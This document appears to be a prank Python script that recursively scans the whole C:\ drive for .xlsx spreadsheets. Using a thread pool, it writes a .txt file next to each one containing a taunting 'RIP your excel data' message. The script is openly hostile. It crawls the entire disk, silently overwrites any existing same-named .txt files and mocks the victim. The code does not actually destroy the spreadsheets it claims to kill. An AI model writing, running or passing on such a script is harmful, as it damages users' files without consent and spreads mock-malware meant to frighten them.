import os
from concurrent.futures import ThreadPoolExecutor

# Directory to start search (root of the file system)
search_directory = 'C:\\'  # Change to 'C:/' for Windows, '/' for Linux/Mac

def process_file(file_path):
    txt_file_path = file_path[:-5] + '.txt'  # Change file extension from .xlsx to .txt
    with open(txt_file_path, 'w') as txt_file:
        txt_file.write('RIP your excell data buddy (btw i use arch linux xD)')

# List to hold all found .xlsx files
xlsx_files = []

# Walk through the directory
for dirpath, dirnames, filenames in os.walk(search_directory):
    for file in filenames:
        if file.endswith('.xlsx'):
            # Append the full file path to the list
            xlsx_files.append(os.path.join(dirpath, file))

# Use ThreadPoolExecutor to process files in parallel
with ThreadPoolExecutor() as executor:
    executor.map(process_file, xlsx_files)
